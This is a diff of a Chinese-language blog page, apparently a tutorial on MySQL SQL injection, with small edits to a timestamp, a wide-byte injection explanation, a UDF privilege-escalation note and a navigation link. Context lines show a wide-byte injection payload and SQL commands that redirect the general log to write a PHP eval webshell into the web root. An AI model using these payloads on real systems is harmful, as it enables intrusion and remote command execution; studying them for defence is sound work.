@@ -27,7 +27,7 @@
 <meta property="og:description" content="本篇研究 SQL注入（SQL Injection），主要从mysql视角 SQL 注入（SQLi） 是一种将恶意 SQL 语句注入到应用程序的数据库查询中的攻击方式，攻击者可利用漏洞读取、修改、删除数据库中的数据，甚至执行数据库系统命令。  原理Web 应用接收用户输入后，直接拼接进 SQL 查询语句中执行，导致攻击者构造的 SQL 语句也一并被执行。 举例：12$username &#x3D; $_GET">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-05-22T13:00:00.000Z">
-<meta property="article:modified_time" content="2025-05-28T14:53:30.648Z">
+<meta property="article:modified_time" content="2025-05-29T07:50:48.743Z">
 <meta property="article:author" content="xiaotian">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="sqli">
@@ -434,7 +434,7 @@
 </ul>
 <hr>
 <h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>服务端过滤 <code>&#39;</code> 成为 <code>\&#39;</code>，但在 GBK 编码下，<code>\</code>+字节可能构成一个合法汉字，从而绕过转义。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">输入：<span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1 --</span><br><span class="hljs-string">变成：%df\&#x27;</span><br>但在 GBK 中 <span class="hljs-operator">%</span>df\ 与接下来的字符构成合法字符<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">输入：<span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1 --</span><br><span class="hljs-string">变成：%df\&#x27;</span><br>但在 GBK 中 <span class="hljs-operator">%</span>df\ 构成合法字符<br></code></pre></td></tr></table></figure>
 
 <p>用于绕过防护、配合报错或盲注。</p>
 <h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ol>
@@ -495,7 +495,8 @@
 
 <h3 id="日志写入WebShell"><a href="#日志写入WebShell" class="headerlink" title="日志写入WebShell"></a>日志写入WebShell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;ON&#x27;</span>;								#开启日志<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;/var/www/html/shell.php&#x27;</span>;	#设置日志文件路径<br><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;					#写入一句话 WebShell<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;OFF&#x27;</span>;								#关闭日志<br></code></pre></td></tr></table></figure>
 
-<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p><strong>UDF</strong> 是 MySQL 允许用户用 C&#x2F;C++ 编写的动态库（<code>.so</code> 或 <code>.dll</code> 文件），加载到 MySQL 后可作为函数调用。</p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>mysql配置文件secure_file_priv项设置为空</p>
+<p><strong>UDF</strong> 是 MySQL 允许用户用 C&#x2F;C++ 编写的动态库（<code>.so</code> 或 <code>.dll</code> 文件），加载到 MySQL 后可作为函数调用。</p>
 <p>通过 UDF，可以执行一些原本 SQL 不支持的功能，比如访问系统级 API。</p>
 <p>攻击者利用上传或写入恶意 UDF 文件，实现数据库进程权限的系统命令执行。</p>
 <p>利用流程</p>
@@ -618,9 +619,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/05/28/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/" title="Flask内存马查杀">
+                      <a href="/2025/05/28/Linux%E6%8F%90%E6%9D%83%E7%AF%87/" title="Linux提权">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Flask内存马查杀</span>
+                        <span class="hidden-mobile">Linux提权</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
